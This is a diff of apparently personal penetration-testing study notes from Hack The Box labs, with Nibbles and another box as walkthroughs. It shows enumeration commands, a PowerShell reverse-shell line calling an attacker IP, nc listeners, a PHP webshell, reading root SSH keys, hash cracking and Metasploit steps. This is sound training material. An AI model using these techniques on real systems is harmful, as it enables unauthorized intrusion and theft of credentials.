@@ -1,7 +1,7 @@
 # General Notes from the HTB Pentration tester path.
 ---
 # Common Ports
-```
+```text
 20/21   (TCP)	    FTP File Transfer Protocol, used to move files around
 22      (TCP)	    SSH Secure Shell, used to securly connect to and manage hosts
 23      (TCP)	    Telnet Same as SSH just not secure at all, used to connect to hosts and manage them just in clear text.
@@ -31,7 +31,7 @@ nc 10.10.10.10 22
 **Tmux** - Used for multiboxing terminals, ctr + b opens a new terminal, and we can swtich between them with 0, 1 ect. Shift + " will split them horizontally, and Shift + % will split them vertically. Also can switch between the windows with up down left or right keypad arrows.
 
 **VIM** - a text editor.. to edit file hit i (insert mode) 
-```
+```text
 Command	Description
 x	    Cut character
 dw	    Cut word
@@ -71,10 +71,10 @@ get login.txt
 smbclient -N -L \\\\10.129.53.353
 ```
 This will also list the users and the shares they are a part of. To target a specific users share run:
-```bash 
+```bash
 smbclient \\\\10.129.42.253\\users
 ```
-If you need to do it in the contex of a user the following works but also will prompt for a password.
+If you need to run this **in the context of another user**, the following approach works but may prompt for a password.
 ```bash
 smbclient -U bob \\\\10.129.43.253\users
 ```
@@ -91,7 +91,7 @@ gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Conten
 Link to http status codes: https://en.wikipedia.org/wiki/List_of_HTTP_status_codes
 
 Installation of Seclist
-```bash 
+```bash
 git clone https://github.com/danielmiessler/SecLists
 sudo apt install seclists -y 
 ```
@@ -170,7 +170,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.
 ```bash
 nc -lvnp 4444
 ```
-```
+```text
 -l - listen for a connection
 -v - verbose mode
 -n - disable dns resolution only connect from IPs
@@ -201,7 +201,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 Then run ctrl+z
 Then run in terminal:
-```bash 
+```bash
 stty raw -echo
 fg
 ```
@@ -224,20 +224,20 @@ After that you should have an upgraded shell where you can use all the normal sh
 These typically need to be uploaded to a websevers webroot directory and execute them through the web browser. These are the common webroot default directories.
 
 Web Server - Apache
-```
+```text
 /var/www/html/
 ```
 Web Server - Nginx
-```
+```text
 /usr/local/nginx/html/
 ```
 Web Server - IIS
-```
+```text
 c:\inetpub\wwwroot\
 
 ```
 Web Server - XAMPP
-```
+```text
 C:\xampp\htdocs\
 ```
 The command to write a webshell to one of these diretories is very straight forward, however it may need to be url encoded.
@@ -259,7 +259,7 @@ ip a
 # Privilege Escalation
 **Helpfull Links**
 When landing on a host, typically we have a lower privileged shell, to esclate privs on windows we want to get the System account on linux the target is Root. Some really great places to start are:
-```
+```text
 HackTricks: https://book.hacktricks.xyz/
 PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
 GTFO Bins: https://gtfobins.github.io/
@@ -267,7 +267,7 @@ LOLBAS: https://lolbas-project.github.io/#
 ```
 **Host Enumeration**
 There are also enumeration scripts that can aid in identifying vulnerabilities on a host. They will run through a list of predfined commands and places to look, and return results. Common Enumeration Scripts Include:
-```
+```text
 Linux:
 https://github.com/rebootuser/LinEnum.git
 https://github.com/sleventyeleven/linuxprivchecker
@@ -291,14 +291,14 @@ Vulnerable software versions can also be leveraged, public exploits can be found
 **User Privileges** - These can be exploited by SUID, Windows Token Privileges, and sudo.
 
 Good command to check when landing on a box is -
-```bash 
+```bash
 sudo -l
 ```
 This is able to check what the current privs allowed for sudo with the user.
 
 **Scheduled Tasks**
 In linux these are called Cron Jobs, windows they are scheduled tasks. The two ways they are typically abused is by adding a new scheduled task or by tricking the current scheduled tasks to execute a malicous binary. If you have write privs on the follwing directories you can add a Cron Job:
-```
+```text
 /etc/crontab
 /etc/cron.d
 /var/spool/cron/crontabs/root
@@ -307,7 +307,7 @@ We can also get credentials via exposed command history logs, these command hist
 
 **SSH Keys**
 Having read access to the SSH directory allows us to extract a users private keys. They can be found at:
-```
+```text
 /home/user/.ssh/id_rsa 
 /root/.ssh/id_rsa
 ```
@@ -327,7 +327,7 @@ Check sudo perms
 su -l
 ```
 This reveals that user1 can launch a shell for user2 via
-```bash 
+```bash
 sudo -u user2 /bin/bash
 ```
 Next I tried to enumerate suid binaries with 
@@ -335,7 +335,7 @@ Next I tried to enumerate suid binaries with
  find / -perm -4000 -type f 2>/dev/null
 ```
 No results so checked if root ssh dir was readable, it was :)
-```bash 
+```bash
 find / -type f -name "id_rsa" 2>/dev/null
 ```
 After that read the key:
@@ -343,20 +343,24 @@ After that read the key:
 cat /root/.ssh/id_rsa
 ```
 Copied the key over to local kali host, into root_key than used it to login to the root user via ssh.
-```bash 
+```bash
 nano root_key
 chmod 600 root_key
 ssh -i root_key root@<IP>
 ```
-boom flag.
+Retrieve the **user** and **root** flags per the lab instructions.
+
 # Transfer Files
-Many labs will require tools to be transfered to the host, or they require content to be moved off the host, in these cases the following methods work 
-**Wget or Curl**
-First host the file on a local python web sever on local host, cd to dir where tools are located.
-```bash 
+
+Labs often require moving tools onto a target or exfiltrating artifacts. Common methods:
+
+**wget / curl**
+
+Serve files from your machine (example: Python HTTP server), then pull from the target:
+```bash
 python3 -m http.server 8000
 ```
-Now the source host is listening on 8000 and will server files we can call to it from our target host.
+The source host listens on TCP **8000**; the target can download files with `wget` or `curl`.
 **wget**
 ```bash
 wget http://10.10.14.1:8000/linenum.sh
@@ -369,7 +373,7 @@ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
 ```bash
 scp linenum.sh user@remotehost:/tmp/linenum.sh
 ```
-Sometimes because of a firewall you cannot use the standard methods to pull a script onto the host. To achieve this you can coppy the script into a base64 
+If inbound HTTP is blocked, encode the payload as **base64**, paste it on the target, then decode:
 Local Host
 ```bash
 base64 shell -w 0
@@ -380,12 +384,12 @@ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
 ```
 ---
 # Prac-App
-**Step 1** - Enumerate open ports on machine via NMAP. The command will conduct a service scan for open ports -oA will output everything nibbles_initial_scan will ouput the scan as that file name in gnmap, nmap, and xml formats. Its a way to name and save your differnt types of scans.
-```bash 
+**Step 1 —** enumerate open ports with Nmap. `-oA nibbles_initial_scan` writes **GNmap**, **Nmap**, and **XML** outputs with a shared basename so you can keep scan variants organized.
+```bash
 nmap -sV --open -oA nibbles_initial_scan 10.129.42.190
 ```
-The scan revealed two open ports 22/80--
-```
+The scan shows **TCP 22** and **TCP 80** open.
+```text
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:41 EST
 Nmap scan report for 10.129.42.190
 Host is up (0.11s latency).
@@ -397,28 +401,27 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 **Step 2** Further enumeration what web server is running 
-```bash 
+```bash
 whatweb 10.129.42.190
 ```
-```
+```text
 http://10.129.42.190 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190]
 ```
-Browseing to the page showed jsut a hellow word but inspecting the source of the page for comments disclosed another directory. nibbleblog
-Doing another whatweb to this new directory revealed more tech being used on the site.
+Browsing to the site showed minimal content; **HTML source comments** referenced an additional path: **`nibbleblog`**. Re-run **`whatweb`** against that path to fingerprint the stack.
 ```bash
 whatweb http://10.129.42.190/nibbleblog
 ```
-```
+```text
 http://10.129.42.190/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], RedirectLocation[http://10.129.42.190/nibbleblog/], Title[301 Moved Permanently]
 http://10.129.42.190/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
 ```
-This appilcation is exploiateble via file upload vulnerability boom. Uploading a php webshell that can be used for exploitation. Looking at the metasploit module for this vulnerability shows that we will need a valid admin username and password to exploit this vulnerability. 
+The application is vulnerable to **unsafe file upload** (PHP). A small proof webshell is enough to confirm code execution. The Metasploit module for this issue requires **valid admin credentials**, so collect those before attempting module-based exploitation. 
 **Step 3**
-We now need to find a valid admin username and password to get RCE. We can use gobuster to futher enumerate web directories from the site. 
+Next, recover a valid admin username and password for RCE prerequisites. Use **`gobuster`** (or similar) to enumerate additional web paths under `/nibbleblog/`. 
 ```bash
 gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
 ```
-```
+```text
 2020/12/17 00:10:47 Starting gobuster
 ===============================================================
 /.hta (Status: 403)
@@ -439,9 +442,9 @@ gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/seclists/
 This confirmes the presence of an admin.php page and a readme page. The readme confirms the version of nibbleblog which validates it is infact vulnerable to the metasploit module. On the admin page we can try a variety of user names and passwords but none work. Looking at the other directories in nubbleblog content we find a users.xml which confirms the username is admin, but no password. Since the file is in xml we can return it in xml via curl with the xmllint command
 ```bash
  curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -
- ```
+```
  snip-
- ```
+```text
    <user username="admin">
 ```
 password is just name of the box nibbles one of those things where lucky guess and inference take the day.
@@ -452,7 +455,7 @@ Once we have logged into the admin portal we find we can uplaod an image with on
 <?php system('id'); ?>
 ```
 We than browse to the location where the shell is being stored
-```
+```text
 http://10.129.239.88/nibbleblog/content/private/plugins/my_image/image.php
 ```
 This executs the command and returns id, so command excution is working in this directory, now we just need to upgrade to a reverse shell via --
@@ -470,7 +473,7 @@ The shell needs to be upgraded so I updatted the TTY via
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 From there we can look for interesting files, or we can use LinEnum to enumerate interesting files permissions on the system. To get LinEnum I did the following --
-```
+```text
 Downloaded - https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 ```
 Hosted Python web server to server enum script to host
@@ -486,7 +489,7 @@ Set script as executable
 chmod +x linenum.sh
 ```
 Executed the script which showed a file could be launched as sudo --
-```
+```text
 
 [+] Possible sudo pwnage!
 /home/nibbler/personal/stuff/monitor.sh
@@ -501,7 +504,7 @@ After that is was straight forward just spin up a nc listener on 4445 catch the 
 
 # Alternate Escelation method
 Metasploit Commands
-```
+```text
 msf6 > search nibbleblog
 msf6 > use 0
 msf6 exploit(multi/http/nibbleblog_file_upload) > set rhosts 10.129.200.170
@@ -542,7 +545,7 @@ http://10.129.42.249 [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HT
 ```
 Nothing really of interest on the page, pivoted to gobuster -
 ```bash
-┌──(kali㉿kali)-[~]
+┌──(kali@kali)-[~]
 └─$ gobuster dir -u http://10.129.42.249 --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
 ===============================================================
 Gobuster v3.6
@@ -574,11 +577,11 @@ Progress: 4746 / 4747 (99.98%)
 ===============================================================
 Finished
 ===============================================================
-```                                                              
+```
 Login Page - http://10.129.42.249/admin/
 Backups empty - http://10.129.42.249/backups/
 Data - interesting, had admin user and pass
-```
+```text
 {"status":"0","latest":"3.3.16","your_version":"3.3.15","message":"You have an old version - please upgrade"}
 <apikey>4f399dc72ff8e619e327800f851e9986</apikey>
 <USR>admin</USR>
@@ -588,7 +591,7 @@ Data - interesting, had admin user and pass
 ```
 That shows we have an admin account name, with a hashed password john should make quick work of that.
 ```bash
-┌──(kali㉿kali)-[~]
+┌──(kali@kali)-[~]
 └─$ john --wordlist=/home/kali/Desktop/rockyou.txt  pwd.txt 
 Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
 Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
@@ -617,7 +620,7 @@ I was able to edit the theme and place a reverse shell on the beginning of the p
 From there all I had to do was setup a nc listener and trigger the shell by browsing back to
 http://10.129.42.249/index.php
 This got us a shell on the box. Which I than upgraded the TTY shell with 
-```python 
+```python
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 From there I started seeing what folders were r/w able I moved into the tmp dir and pulled down linenum to check for priv esc vectors. 
@@ -627,7 +630,7 @@ www-data@gettingstarted:/tmp/new$ chmod +x linenum.sh
 www-data@gettingstarted:/tmp/new$ ./linenum.sh
 ```
 This found!
-```
+```text
 [+] Possible sudo pwnage!
 /usr/bin/php
 ```
